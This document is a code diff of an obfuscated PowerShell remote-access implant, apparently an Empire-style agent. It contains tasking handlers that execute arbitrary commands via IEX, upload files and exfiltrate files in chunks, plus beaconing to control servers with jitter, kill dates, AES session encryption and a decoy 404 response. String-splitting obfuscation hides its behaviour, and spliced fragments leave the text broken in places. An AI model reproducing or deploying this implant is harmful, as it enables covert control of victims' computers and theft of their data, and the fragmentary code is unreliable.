+            Bsn{SCnwqRIpT:HenwqAnwqDErS}.(WA8GetEnWA8','-and ((&(WA8Get-DaWA8+WA8tWA8+WA8eWA8)) -gt Bsn{SCrInwqpnwqT:nwqKilLDnwqATe})) {
+                Bsn{MnwqSg} = (WA8[WA8+WA8!] AgeWA8+WA8nWA8+WA8t WA8)+Bsn{scRIPtnwq:sESsnwqionnwqID}+(WA8 exitiWA8+WA8ng:WA8+WA8 pasWA8+WA8t killdatWA8+WA8eWA8);
+            }
+            else {
+','                Bsn{ps}.(WA8EndInWA8+WA8voWA8+WA8keWA8).Invoke(Bsn{tAnwqSk});
+                        Bsn{resUnwqLts} = Bsn{pipenwqOutnwqpUT}.(WA8T','ectWA8+WA8ory_naWA8+WA8mWA8+WA8eWA8) = x6Vc/x6Vc; (WA8diWA8+WA8rectory_WA8+WA8patWA8+WA8hWA8) = x6Vc/x6Vc; (WA8iWA8+WA8temsWA8) = Bsn{ArnwqRnwqAy}} jRbz &(WA8ConWA8+WA8vWA8+WA8ertTo-WA8+WA8JsonWA8) -Compress;
+                } elseif (-Not (&(WA8TesWA8+WA8tWA8+WA8-PathWA8) Bsn{PnwqATH} -PathType (WA8ConWA8+WA8tainWA8+WA8erWA8))) {
+                    Bsn{OnwqUnwqTpUt} = (WA8DirWA8+WA8ectWA8+WA8ory WA8) + Bsn{pnwqAtH} + (WA8 WA8+WA8not fWA8+WA8ounWA8+WA8d.WA8);
+                } else {
+                    Bsn{AnwqRnwqRaY} = @();
+                    &(WA8GeWA8+WA8tWA8+WA8-ChWA8+WA8ildItemWA8) -force -Path Bsn{panwqTH} -Attributes (WA8!WA8+WA8directWA8+WA8oryWA8) jRbz &(WA8forWA8+WA8each-WA8+WA8obWA8+WA8jecWA8+WA8tWA8) { Bsn{AnwqRnwqRaY} += (@{ (WA8patWA8+WA8hWA8) = Bsn{_}.x6VcfunwqLnwqLNaMex6Vc; (WA8namWA8+WA8eWA8) = Bsn{_}.x6VcnnwqAmEx6Vc; (WA8isWA8+WA8_filWA8+WA8eWA8) = Bsn{TRnwqUE} }) };
+                    &(WA8GeWA8+WA8tWA8+WA8-ChilWA8+WA8dItWA8+WA8emWA8) -force -Path Bsn{pnwqATh} -Attributes (WA8direWA8+WA8ctorWA8+WA8yWA8) jRbz &(WA8foreWA8+WA8acWA8+WA8h-oWA8+WA8bWA8+WA8jectWA8) { Bsn{ARrnwqAy} += (@{ (WA8patWA8+WA8hWA8) = Bsn{_}.x6VcfuLnwqlnamex6Vc; (WA8namWA8+WA8eWA8) = Bsn{_}.x6VcNanwqMex6Vc; (WA8isWA8+WA8_fileWA8) = Bsn{fnwqAlSE} }) };
+                    Bsn{DInwqRecnwqTnwqoRY} = &(WA8GetWA8+WA8-ItWA8+WA8emWA8) -force -Path Bsn{PnwqAtH};
+                    Bsn{ounwqTPnwqUt} = @{ (WA8diWA8+WA8rectorWA8+WA8yWA8+WA8_nameWA8) = Bsn{DiRecnwqTnwqorY}.x6VcnAnwqmex6Vc; (WA8dWA8+WA8irecWA8+WA8tory_pWA8+WA8athWA8) = Bsn{dnwqIREnwqCnwqTORy}.x6VcFuLnwqlNanwqmEx6Vc; (WA8itWA8+WA8emsWA8) = Bsn{aRnwqRay} } jRbz &(WA8ConveWA8+WA8rtTWA8+WA8o-WA8+WA8JsonWA8) -Compress;
+                    if (Bsn{DIRecnwqTnwqORY} -eq Bsn{nnwqULL})
+                    {
+                        Bsn{onwqUnwqTput} = (WA8UseWA8+WA8rWA8+WA8 doeWA8+WA8s nWA8+WA8ot havWA8+WA8e acWA8+WA8cesWA8+WA8s toWA8+WA8 WA8+WA8directoryWA8+WA8 WA8) + Bsn{PanwqTh};
                     }
-                    elseif($ChunkSize -gt 8MB) {
-                        $ChunkSize = 8MB;
+                }
+                &(WA8EncWA8+WA8ode-PaWA8+WA8ckWA8+WA8etWA8) -data Bsn{onwqUTnwqput} -type Bsn{tYnwqpe} -ResultID Bsn{ReSnwqUlnwqTId};
+            }
+            elseif(Bsn{tnwqyPe} -eq 44){
+                try{
+                    Bsn{PnwqArTS} = Bsn{DnwqATa}.(WA8splWA8+WA8itWA8).Invoke(x6Vc,x6Vc);
+                    Bsn{pnwqAnwqRaMS} = Bsn{pnwqARTs}[1..Bsn{panwqRnwqTS}.x6VclnwqEnwqNgTHx6Vc];
+      ','qER}};
+        Bsn{rnwqANDnwqNAme};
+    }
+    function gEt-nwqAGEnwqNTnwqjOBcnwqOMpnwqleTEd {
+
+        param(Bsn{jobNnwqAme})
+        if(Bsn{scRnwqInwqpT:JObs}.(WA8ContWA8+WA8aiWA8+WA8nsKeyWA8).Invoke(Bsn{jobNAnwqme})) {
+            Bsn{ScRinwqpTnwq:JonwqBS}[Bsn{jOBnwqNnwqAME}][(WA8JWA8+WA8obWA8)].x6VciscoMplnwqEnwqTEDx6Vc;
+        }
+    }
+    function rECeiVEnwq-agnwqEnwqNnwqTjOB {
+        &(WA8Start-SWA8+WA8leWA8+WA8epWA8) -Seconds 1.5
+        &(WA8parWA8+WA8amWA8)(Bsn{joBNAnwqmE})
+        if(Bsn{scnwqRnwqipt:nwqjOBS}.(WA8','WA8+WA8yptogrWA8+WA8aWA8+WA8phy.RiWA8+WA8jnWA8+WA8daelMaWA8+WA8nWA8+WA8agWA8+WA8edWA8);
+        }
+        Bsn{AnwqES}.x6VcmonwqDEx6Vc = (WA8CWA8+WA8BCWA8);
+        Bsn{Anwqes}.x6VcknwqEyx6Vc = Bsn{ennwqCOnwqdIng}.(WA8GeWA8+WA8tWA8+WA8BytesWA8).Invoke(Bsn{SnwqesSnwqionkeY});
+        Bsn{anwqES}.x6VcIVx6Vc = Bsn{InwqV};
+        Bsn{CipnwqHnwqeRTEnwqXt} = Bsn{iv} + (Bsn{AnwqEs}.(WA8CrWA8+WA8eWA8+WA8aWA8+WA8teEncryptWA8+WA8orWA8).Invoke()).(WA8TranWA8+WA8sWA8+WA8formFinWA8+WA8alBlockWA8).Invoke(Bsn{BYnwqTEs}, 0, Bsn{BnwqyTeS}.x6VcLnwqENGTHx6Vc);
+        Bsn{hmnwqAc}.x6VcknwqEyx6Vc = Bsn{ENconwqdinwqNg}.(WA8GetByWA8+WA8tWA8+WA8esWA8).Invoke(Bsn{sESnwqSIOnwqNKey});
+        Bsn{CnwqIpnwqhERTExt} + Bsn{HnwqMaC}.x6VcCOmpnwqUnwqTEnwqhaShx6Vc(Bsn{ciPnwqHenwqRTEnwqXT})[0..9];
+    }
+    function dEnwqCRyPTnwq-ByTeS {
+        
+        param (Bsn{INBnwqYTnwqES})
+        if(Bsn{INBynwqTEs}.x6VcLEnGnwqTHx6Vc -gt 32) {
+            Bsn{MnwqAc} = Bsn{InBytnwqEs}[-10..-1];
+            Bsn{iNnwqBytnwqeS} = Bsn{InBnwqYtES}[0..(Bsn{InwqNbnwqYTeS}.x6VcLnwqenGnwqTHx6Vc - 11)];
+            Bsn{HmnwqAC}.x6VcKnwqEyx6Vc = Bsn{ENcnwqOnwqDing}.(WA8GetByteWA8+WA8sWA8).Invoke(Bsn{sEnwqSnwqsiOnnwqKEy});
+            Bsn{eXnwqPecnwqTED} = Bsn{hnwqMaC}.x6VcCnwqOMpnwqUTnwqEhASHx6Vc(Bsn{iNBynwqTnwqEs})[0..9];
+            if (@(&(WA8CWA8+WA8oWA8+WA8mpare-ObjeWA8+WA8ctWA8) Bsn{mnwqAc} Bsn{exnwqpenwqctnwqed} -sync 0).x6VclnwqEnGtHx6Vc -ne 0) {
+                return;
+            }
+            Bsn{InwqV} = Bsn{InbnwqytES}[0..15];
+            try {
+                Bsn{AnwqES}=&(WA8New-WA8+WA8ObjecWA8+WA8tWA8) (WA8SystWA8+WA8em.SeWA8+WA8cuWA8+WA8riWA8+WA8ty.CrWA8+WA8yptogWA8+WA8raphyWA8+WA8.AWA8+WA8esCWA8+WA8ryWA8+WA8ptoWA8+WA8ServicePWA8+WA8rovideWA8+WA8rWA8);
+            }
+            catch {
+                Bsn{AnwqEs}=&(WA8NWA8+WA8eWA8+WA8w-ObjecWA8+WA8tWA8) (WA8System.SWA8+WA8ecuriWA8+WA8ty.CryptogWA8+WA8raphy.WA8+WA8RijndWA8+WA8aWA8+WA8e','voke() -ne WA8WA8)) {
+                        &(WA8EnWA8+WA8codeWA8+WA8-PacketWA8) -type Bsn{tnwqype} -data Bsn(Bsn{REsnwqUnwqLTS}) -ResultID Bsn{JnwqoBrEsnwqULtnwqId};
                     }
-                    else {
-                        $ChunkSize = 1024KB;
+                    &(WA8EnWA8+WA8code-PackWA8+WA8etWA8) -type 51 -data (WA8JobWA8+WA8 WA8+x6VcBsnJobName x6Vc+WA8kilWA8+WA8leWA8+WA8d.WA8) -ResultID Bsn{jObresnwqUlnwqTnwqId};
+                }
+                catch {
+                    &(WA8Encode-PaWA8+WA8cWA8+WA8ketWA8) -type 0 -data (WA8[WA8+WA8!] WA8+WA8EWA8+WA8rror WA8+WA8inWA8+WA8 WA8+WA8stoppWA8+WA8iWA8+WA8ng WA8+WA8jobWA8+WA8: WA8+x6VcBsnJobNamex6Vc) -ResultID Bsn{jnwqOBrESULnwqTnwqiD};
+                }
+            }
+            elseif(Bsn{Tnwqype} -eq 60) {
+                &(WA8EWA8+WA8ncoWA8+WA8de-PWA8+WA8acketWA8) -type 0 -data (WA8[!] SOCKS serWA8+WA8vWA8+WA8er not implemenWA8+WA8tWA8+WA8eWA8+WA8dWA8) -ResultID Bsn{rESunwqlnwqTid};
+            }
+            elseif(Bsn{tYnwqpE} -eq 61) {
+                &(WA8EncodWA8+WA8e-PacWA8+WA8keWA8+WA8tWA8) -type 0 -data (WA8[!WA8+WA8]WA8+WA8 SOCKS seWA8+WA8rveWA8+WA8r dWA8+WA8ata not impWA8+WA8lWA8+WA8ementedWA8) -ResultID Bsn{ResnwqUlTiD};
+            }
+            elseif(Bsn{TYnwqpE} -eq 100 -or Bsn{tnwqYPE} -eq 118) {
+                Bsn{rEsunwqlTDnwqAnwqTA} = &(WA8IEWA8+WA8XWA8) Bsn{DnwqAtA};
+                if(Bsn{RESUnwqltdnwqATA}) {
+                    &(WA8EncoWA8+WA8dWA8+WA8eWA8+WA8-PackWA8+WA8etWA8) -type Bsn{TnwqYPe} -data Bsn{rnwqesUnwqltDaTA} -ResultID Bsn{RnwqESUnwqlTId};
+                }
+            }
+            elseif(Bsn{tYnwqpe} -eq 101 -or Bsn{tnwqyPe} -eq 119) {
+                Bsn{pReFnwqix} = Bsn{dAnwqTa}.(WA8SubsWA8+WA8trinWA8+WA8gWA8).Invoke(0,15);
+                Bsn{eXtENnwqSnwqion} = Bsn{DnwqAtA}.(WA8SubsWA8+WA8triWA8+WA8ngWA8).Invoke(15,5);
+                Bsn{dnwqATA} = Bsn{dnwqAta}.(WA8SubstWA8+WA8riWA8+WA8ngWA8).Invoke(20);
+                &(WA8EWA8+WA8ncode-WA8+WA8PacketWA8) -type Bsn{tnwqype} -data (Bsn{PnwqRefnwqIX} + Bsn{enwqXTenwqNnwqSIOn} + (&(WA8IEWA8+WA8XWA8) Bsn{dnwqAta})) -ResultID Bsn{RenwqsnwqUlTId};
+            }
+            elseif(Bsn{TYnwqpe} -eq 110 -or Bsn{tnwqYpe} -eq 112) {
+                Bsn{JObnwqId} = &(WA8StaWA8+WA8rt-AWA8+WA8geWA8+WA8ntWA8+WA8JobWA8) Bsn{DanwqTa};
+                Bsn{snwqCrIPnwqT:RenwqSulnwqTInwqDS}[Bsn{JOnwqBid}]=Bsn{ReSnwqULTnwqid};
+        ','ConWA8+WA8tWA8+WA8ainsKeyWA8).Invoke(Bsn{JoBnwqNamE})) {
+            Bsn{ScrnwqIpnwqT:jOBs}[Bsn{jnwqOBnnwqAme}][(WA8BWA8+WA8ufferWA8)].(WA8RWA8+WA8eadAllWA8).Invoke();
+        }
+    }
+    function STOnwqpnwq-AgnwqENnwqTJOB {
+
+        param(Bsn{jObnnwqAME})
+        if(Bsn{sCrIPtnwq:jOnwqBs}.(WA8CoWA8+WA8nWA8+WA8tainsWA8+WA8KeyWA8).Invoke(Bsn{JnwqObnwqNAmE})) {
+            Bsn{NnwqULL} = Bsn{sCnwqRIPnwqT:nwqJObS}[Bsn{jobnwqNanwqME}][(WA8PSHoWA8+WA8stWA8)].(WA8SWA8+WA8topWA8).Invoke();
+            Bsn{scnwqRIPt:nwqjonwqBs}[Bsn{jobnwqNnwqAMe}][(WA8BufWA8+WA8ferWA8)].(WA8ReadWA8+WA8AWA8+WA8llWA8).Invoke();
+            Bsn{NnwqULl} = [AppDomain]::x6VcunwqNlOnwqAdx6Vc(Bsn{SnwqcnwqRipt:JoBS}[Bsn{JOnwqBNanwqmE}][(WA8AppDoWA8+WA8maiWA8+WA8nWA8)','       }
+                ca','(WA8AdWA8+WA8d-MWA8+WA8emberWA8) (WA8NoteprWA8+WA8oWA8+WA8pertyWA8) (WA8IPSubnWA8+WA8etWA8) Bsn(Bsn{_}.x6VcIPsUnwqBNnwqeTx6Vc -join x6Vc,x6Vc);
+                        Bsn{onwqUt} jRbz &(WA8AddWA8+WA8-MembWA8+WA8erWA8) (WA8NWA8+WA8otWA8+WA8eproperWA8+WA8tyWA8) (WA8DWA8+WA8efauWA8+WA8ltIPGateWA8+WA8waWA8+WA8yWA8) Bsn(Bsn{_}.x6VcDEnwqFauLtnwqIPnwqGATEWAyx6Vc -join','tch {
+                    &(WA8Encode-WA8+WA8PackWA8+WA8eWA8+WA8tWA8) -type 0 -data Bsn{enwqRRoR} -ResultID Bsn{RenwqSULnwqTId};
+                }
+            }
+            elseif(Bsn{TnwqYPe} -eq 43) {
+                Bsn{OUTnwqPUt} = x6Vcx6Vc;
+                Bsn{pAnwqTH} = x6Vc/x6Vc;
+                if (Bsn{dAnwqTA}.x6VcLnwqennwqgtHx6Vc -gt 1) {
+                    Bsn{PnwqATh} = Bsn{danwqTA};
+                }
+                if (Bsn{pnwqAtH} -eq x6Vc/x6Vc) {
+                    Bsn{aRnwqRay} = @();
+                    Bsn{DrnwqIvnwqES} = &(WA8GeWA8+WA8t-WA8+WA8PWA8+WA8SDriveWA8) -PSProvider (WA8FiWA8+WA8leSystWA8+WA8emWA8) jRbz&(WA8wWA8+WA8hereWA8) {(Bsn{_}.x6VcUsnwqedx6Vc -gt 0)} jRbz &(WA8ForEacWA8+WA8h-ObjecWA8+WA8tWA8) {
+                        Bsn{anwqRrAY} += (@{(WA8paWA8+WA8thWA8) =  Bsn{_}.x6VcROnwqOTx6Vc; (WA8nWA8+WA8ameWA8) = Bsn{_}.x6Vcronwqotx6Vc; (WA8iWA8+WA8s_filWA8+WA8eWA8) = Bsn{FAnwqLnwqSE}});
                     }
-                    $Path = Get-Childitem -Recurse $Path -File  | ForEach-Object {$_.FullName};
-                    foreach ( $File in $Path) {
-                        $Index = 0;
-                        do{
-                            $EncodedPart = Get-FilePart -File "$file" -Index $Index -ChunkSize $ChunkSize;
-                            $filesize = (Get-Item $file).length;
-                            if($EncodedPart) {
-                                $data = "{0}|{1}|{2}|{3}" -f $Index, $file, $filesize, $EncodedPart;
-                                (& $SendMessage -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID));
-                                $Index += 1;
-                                if ($script:AgentDelay -ne 0) {
-                                    $min = [int]((1-$script:AgentJitter)*$script:AgentDelay);
-                                    $max = [int]((1+$script:AgentJitter)*$script:AgentDelay);
-                                    if ($min -eq $max) {
-                                        $sleepTime = $min;
+                    Bsn{OUnwqTnwqpUT} = @{(WA8dWA8+WA8ir','                Bsn{Mnwqsg} = (WA8[WA8+WA8!]WA8+WA8 Agent WA8)+Bsn{ScnwqRInwqPTnwq:senwqSsnwqIoNid}+(WA8 exitiWA8+WA8ngWA8+WA8: LostWA8+WA8 lWA8+WA8imit reaWA8+WA8chedWA8);
+            }
+            (& Bsn{snwqENdnwqMnwqESsaGe} -Packets Bsn(&(WA8EWA8+WA8ncoWA8+WA8de-PWA8+WA8acWA8+WA8ketWA8) -type 2 -data Bsn{mnwqsG}));
+            exit;
+        }
+        if (Bsn{ScriPTnwq:WorKnwqInGhonwqURS} -match WA8^[0-9]{1,2}:[0-5][0-9]-[0-9]{1,2}:[0-5][0-9]BsnWA8) {
+            Bsn{cURrnwqEnwqNt} = &(WA8Get-DWA8+WA8ateWA8);
+            Bsn{sTnwqART} = &(WA8GWA8+WA8et-DWA8+WA8ateWA8) (Bsn{SCnwqRnwqIpTnwq:WORkingnwqHOUnwqRs}.(WA8spWA8+WA8litWA8).Invoke(x6Vc-x6Vc)[0]);
+            Bsn{EnwqNd} = &(WA8GeWA8+WA8t-WA8+WA8DateWA8) (Bsn{snwqcRIpt:wnwqOnwqRKiNghonwqUrS}.(WA8sWA8+WA8plitWA8).Invoke(x6Vc-x6Vc)[1]);
+            if ((Bsn{EnwqND}-Bsn{stanwqRt}).x6VchnwqourSx6Vc -lt 0) {
+                Bsn{STanwqRt} = Bsn{SnwqTaRT}.(WA8AddWA8+WA8DayWA8+WA8sWA8).Invoke(-1);
+            }
+            Bsn{STARtnwqcnwqHeck} = Bsn{CnwqURn','A8bjectWA8) (WA8IO.StrWA8+WA8ingWritWA8+WA8eWA8+WA8rWA8);
+                [Console]::(WA8SeWA8+WA8tOuWA8+WA8tWA8).Invoke(Bsn{sTRinwqNnwqGwrItnwqeR});
+                Bsn{onwqUtput} = &(WA8ieWA8+WA8xWA8) x6VcBsncmdargsx6Vc jRbz &(WA8outWA8+WA8-strinWA8+WA8gWA8);
+                [Console]::(WA8Set','              Bsn{BnwqyteS} = [System.Convert]::x6VcfRnwqoMnwqBnwqAsE64STriNgx6Vc(Bsn{PnwqArnwqTs}[0]);
+                    Bsn{Ms} = &(WA8NWA8+WA8ew-ObWA8+WA8jWA8+WA8ectWA8) (WA8System.IWA8+WA8OWA8+WA8.MemoWA8+WA8ryWA8+WA8SWA8+WA8tWA8+WA8reamWA8);
+                    Bsn{OuTnwqpnwqUt} = &(WA8New-ObjWA8+WA8eWA8+WA8ctWA8) (WA8System.IWA8+WA8O.MemoWA8+WA8ryWA8+WA8StrWA8+WA8eWA8+WA8amWA8);
+                    Bsn{MnwqS}.(WA8WriWA8+WA8teWA8).Invoke(Bsn{bytnwqes}, 0, Bsn{BnwqytES}.x6VclEnwqNnwqGThx6Vc);
+                    Bsn{MS}.(WA8SWA8+WA8eekWA8).Invoke(0,0) jRbz &(WA8Out-NWA8+WA8ullWA8);
+                    Bsn{SR} = &(WA8NewWA8+WA8-OWA8+WA8bjectWA8) (WA8SWA8+WA8ysteWA8+WA8m.WA8+WA8IWA8+WA8OWA8+WA8.CompressioWA8+WA8n.DeflWA8+WA8atWA8+WA8eSWA8+WA8treamWA8)(Bsn{Ms}, [System.IO.Compression.CompressionMode]::x6VcdnwqEnwqCOMPrEssx6Vc);
+                    Bsn{BunwqFfnwqER} = [System.Byte[]]::x6VccnwqReAteiNnwqsTANnwqCex6Vc([System.Byte],40','WA8ToLowWA8+WA8erWA8).Invoke() -eq (WA8shelWA8+WA8lWA8)) {
+    ',');
+            Bsn{WC}.x6VcPnwqROxyx6Vc.x6VccnwqReDeNTiAnwqlsx6Vc = [System.Net.CredentialCache]::x6VcDenwqFAnwqUnwqlTCRedEnTiaLsx6Vc;
+            if(Bsn{snwqcRnwqIPnwqT:pRoXY}) {
+                Bsn{wnwqc}.x6VcpROnwqXyx6Vc = Bsn{snwqcrInwqpT:prnwqOxY};
+            }
+
+            Bsn{Wnwqc}.x6VchEanwqdEnwqRSx6Vc.(WA8AWA8+WA8ddWA8).Invoke((WA8UserWA8+WA8-AgWA8+WA8entWA8),Bsn{sCnwqRiPt:uSenwqRnwqAgent});
+            Bsn{scRinwqpTnwq:hEaDenwqRS}.(WA8GetEWA8+WA8numeWA8+WA8raWA8+WA8torWA8).Invoke() jRbz &(WA8%WA8) {Bsn{WnwqC}.x6VchnwqeADenwqRsx6Vc.(WA8AdWA8+WA8dWA8).Invoke(Bsn{_}.x6VcNAnwqMex6Vc, Bsn{_}.x6VcvnwqAlUex6Vc)};
+            Bsn{wC}.x6VcHeadenwqRsx6Vc.(WA8AWA8+WA8ddWA8).Invoke((WA8CWA8+WA8ooWA8+WA8kieWA8),x6Vcsession=BsnRoutingCookiex6Vc);
+
+
+            Bsn{TaSKunwqRI} = Bsn{SCnwqRnwqinwqPT:nwqTASkuris} jRbz &(WA8GeWA8+WA8t-RWA8+WA8anWA8+WA8domWA8);
+            Bsn{REnwqSulT} = Bsn{wnwqc}.x6VcDOwnnwqLOnwqAdDAnwqTAx6Vc(Bsn{SCnwqRIpt:cOnwqNtRnwqOLnwqServerS}[Bsn{ScRinwqpT:SERVnwqeRnwqinwqNnwqDEx}] + Bsn{TanwqSKuRi});
+            Bsn{ReSnwqULT};
+        }
+    }
+    catch [Net.WebException] {
+        Bsn{ScrIPTnwq:nwqMisnwqSEDchEcknwqIns} += 1;
+        if (Bsn{_}.x6VcenwqXcnwqeptinwqONx6Vc.(WA8GetWA8+WA8BasWA8+WA8eWA8+WA8ExcepWA8+WA8tiWA8+WA8onWA8).Invoke().x6VcrnwqesnwqponSEx6Vc.x6VcSTAtunwqsCOnwqdEx6Vc -eq 401) {
+
+            &(WA8StaWA8+WA8rt-WA8+WA8NegoWA8+WA8tiaWA8+WA8teWA8) -S x6VcBsnScript:serverx6Vc -SK Bsn{SnwqK} -UA Bsn{UnwqA};
+        }
+    }
+};
+function iNvnwqonwqKEnwq-guGu {
+    param(
+        [Parameter(MANdaTORY=Bsn{TnwqRuE})]
+        [String]
+        Bsn{sTAnwqginwqNnwqGKEy},
+        [Parameter(maNdatorY=Bsn{tRnwqUE})]
+        [String]
+        Bsn{SEsnwqsIOnKnwqey},
+        [Parameter(mANDatOry=Bsn{trnwqUE})]
+        [String]
+        Bsn{SenwqsSinwqONiD},
+        [Int32]
+        Bsn{AnwqgEntdnwqelAY} = 12,
+        [Double]
+        Bsn{agennwqTjItnwqTnwqER} = 0.7,
+        [String[]]
+        Bsn{SenwqRnwqVerS},
+        [String]
+        Bsn{KILLnwqDaTe},
+        [Int32]
+        Bsn{killnwqDayS},
+        [String]
+        Bsn{wnwqorkiNghnwqonwqUnwqRs},
+        [object]
+        Bsn{PrOnwqxnwqySetnwqTiNnwqGS},
+        [String]
+        Bsn{pronwqFnwqiLe} = ((WA8/filmeWA8+WA8s/caWA8+WA8sWA8+WA8adefogo,WA8+WA8/filmWA8+WA8eWA8+WA8s/WA8+WA8sWA8+WA8aWA8+WA8nWA8+WA8toWA8+WA8ro,WA8+WA8/filmes/diabovestepraWA8+WA8dWA8+WA8atjbMozilla/WA8+WA85.0 WA8+WA8(WinWA8+WA8doWA8+WA8ws NWA8+WA8T WA8+WA86.1; WOWA8+WA8WWA8+WA864WA8+WA8; TrideWA8+WA8nt/7WA8+WA8.0; rv:WA8+WA811.0) likWA8+WA8e WA8+WA8GecWA8+WA8kWA8+WA8oWA8).(WA8RWA8+WA8EPlaceWA8).Invoke(WA8tjbWA8,WA8jRbzWA8)),
+        [Int32]
+        Bsn{LOnwqsTLIMnwqit} = 67,
+        [String]
+        Bsn{deFnwqAnwqUlnwqTreSpoNsE} = (WA8PCFET0NUWVBFIGh0bWwgUFWA8+WA8VCTElDICItLy9WA8+WA8XM0MvL0RURCBYSFRNTCAxWA8+WA8LjWA8+WA8AgU3RyaWN0LWA8+WA8y9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMWA8+WA8S9EVEQveGh0bWWA8+WA8wWA8+WA8xLXN0cmljdWA8+WA8C5kdGQWA8+WA8iPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIWA8+WA8+CjxoZWFkPgogIWA8+WA8CAgPG1ldGEgY29udGVudD0idGV4dC9odG1sOyBjaGWA8+WA8Fyc2V0PWlWA8+WA8zby04ODU5LTEiIGh0dHAtZXF1aXY9IkNvWA8+WA8bnRlbnQtVHlwZSIvPgogICAgPWA8+WA8HRpdGxlPjQwNCAtIEZpbGUgb3IgZGlyZWN0b3J5IG5vdCBWA8+WA8mb3VuZC48L3RpdGxlPgogWA8+WA8ICAgPHN0eWxlIWA8+WA8HR5cGU9InRleHWA8+WA8QWA8+WA8vY3NzIj4KPWA8+WA8CEtLQpib2R5e21hcmdpbjowO2ZvbnQtc2l6ZTouN2VtWA8+WA8O2ZvbnQtZmFtaWx5OlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRWA8+WA8pY2EsIHNhbnMtc2VyaWY7YmFjWA8+WA8a2dyb3VuZDojRUVFWA8+WA8RUVFO30KZmllbGRzZXR7cGFkZGluZzowIDE1cHggWA8+WA8MTBweCAxNXB4O30gCmgxWA8+WA8e2ZvbnQtc2l6ZToyLjRlbTttYXJnaW46MDtjWA8+WA8b2xvcjojRkZGO30KaDJ7Zm9udC1zaXplOjEuN2VtO21hcmdpbjowO2NvbG9yOiNDQzAwMDA7fSAKaDN7Zm9udC1WA8+WA8zaXplOjEuMmVtO21hcmdpbjoxMHB4IDAgMCAwO2NvbG9yOiMwMDAwMDA7fSAKI2WA8+WA8hlYWRlcntWA8+WA83aWR0aDo5NiU7bWFyZ2luOjAgMCAwIDA7cGFkZGluZzo2cHggMiUgNnB4IDIlO2ZvbnQtZmFtaWx5OiJ0cmVidWNoZXQgTVMiLCBWZXJkYW5hLCBzYW5zLXNlcmlmO2WA8+WA8NvbG9yOiNGRkY7CWA8+WA8mJhY2tncm91bmQtY29sb3I6IzU1NTU1NTt9CiNjb250ZW50e21hcmdpbjowIDAgMCAyJTtwb3NpdGlvbjpyZWA8+WA8WxhdGl2ZTt9Ci5jb250ZW50LWNvbnRhaW5lcntiYWNrZ3JvdW5kOiNGRkY7d2lkdGg6OTYlO21hcmdpbi1WA8+WA80b3A6OHB4O3BhZGRpbmWA8+WA8cWA8+WA86MTBweDtwb3NpdGlvWA8+WA8bjpyZWxhdGl2ZTt9Ci0tPgogICAgPC9zdHlsZT4KPC9oZWFkPgo8WA8+WA8Ym9keT4KPGRpdiBpZD0iaGVhZGVyIj48aDE+U2VydmVyIEVycm9yPC9oMT48L2Rpdj4KPGRpdiBpZD0iY29udGWA8+WA8VudCI+CiAgICWA8+WA8A8ZGl2IGNsYXNWA8+WA8zPSJjb250ZW50LWNvbnRhaW5lciI+CiAgICAgICAgPGZpZWxkc2V0PgogICAWA8+WA8gICAgICAgICA8aDI+NDA0IC0gRmlsWA8+WA8ZSBvciWA8+WA8BkaX','         }
+            elseif(Bsn{TnwqYPe} -eq 1',') (WA8DHWA8+WA8CPEWA8+WA8naWA8+WA8bledWA8) Bsn{_}.x6VcDHcnwqPEnanwqBlEdx6Vc;
+                        Bsn{onwqUt} jRbz &(WA8AddWA8+WA8-MeWA8+WA8mberWA8) (WA8NoteWA8+WA8proWA8+WA8pertyWA8) (WA8IWA8+WA8PAddWA8+WA8ressWA8) Bsn(Bsn{_}.x6VcIpaDDRenwqsSx6Vc -join x6Vc,x6Vc);
+                        Bsn{onwqUT} jRbz &','keWA8+WA8tWA8) -type Bsn{tYnwqPe} -data Bsn(Bsn{danwqTA}) -ResultID Bsn{reSULTnwqiD}));
+                                Bsn{inwqNdex} += 1;
+                                if (Bsn{SCnwqRIPt:aGnwqeNTdnwqELay} -ne 0) {
+                                    Bsn{mnwqiN} = [int]((1-Bsn{SCRnwqiPT:AnwqgEnwqNnwqTjinwqTtER})*Bsn{sCrIPt:nwqAGEnnwqTnwqDelAY});
+                                    Bsn{mnwqAX} = [int]((1+Bsn{sCRinwqpT:AGenTjnwqiTnwqTEr})*Bsn{Scriptnwq:nwqAGeNnwqTDelaY});
+                                    if (Bsn{MnwqIn} -eq Bsn{mnwqAx}) {
+                                        Bsn{slenwqePtInwqME} = Bsn{MnwqiN};
                                     }
                                     else{
-                                        $sleepTime = Get-Random -minimum $min -maximum $max;
+                                        Bsn{slnwqEepTinwqme} = &(WA8GetWA8+WA8-RaWA8+WA8ndomWA8) -minimum Bsn{Mnwqin} -maximum Bsn{mnwqAx};
                                     }
-                                    Start-Sleep -s $sleepTime;
+                                    &(WA8StWA8+WA8artWA8+WA8-SleepWA8) -s Bsn{SlnwqeEptnwqIME};
                                 }
                             }
-                            [GC]::Collect();
-                        } while($EncodedPart)
-                        Encode-Packet -type 40 -data "[*] File download of $file completed" -ResultID $ResultID;
-                    }
-                }
-                catch {
-                    Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID $ResultID;
-                }
+                            [GC]::(WA8CoWA8+WA8lleWA8+WA8ctWA8).Invoke();
+    ','WA8+WA8-PacketWA8) -type Bsn{TnwqyPE} -data Bsn{mnwqsG} -ResultID Bsn{rnwqESnwqUlTID}));
+                exit;
             }
-            elseif($type -eq 42) {
-                $parts = $data.split('|');
-                $filename = $parts[0];
-                $base64part = $parts[1];
-                $Content = [System.Convert]::FromBase64String($base64part);
-                try{
-                    Set-Content -Path $filename -Value $Content -Encoding Byte -ErrorAction Stop -ErrorVariable error
-                    Encode-Packet -type $type -data "[*] Upload of $fileName successful" -ResultID $ResultID;
-                }
-                catch {
-                    Encode-Packet -type 0 -data $error -ResultID $ResultID;
-                }
+            elseif(Bsn{tynwqpe} -eq 34) {
+                &(WA8EncodWA8+WA8e-WA8+WA8PWA8+WA8acketWA8) -type 0 -data (WA8[WA8+WA8!WA8+WA8] PrWA8+WA8oxWA8+WA8y chaiWA8+WA8nWA8+WA8 WA8+WA8not implemWA8+WA8entedWA8) -ResultID Bsn{REsnwqUlnwqTId};
             }
-            elseif($type -eq 43) {
-                $output = "";
-                $path = "/";
-                if ($data.length -gt 1) {
-                    $path = $data;
-                }
-                if ($path -eq "/") {
-                    $array = @();
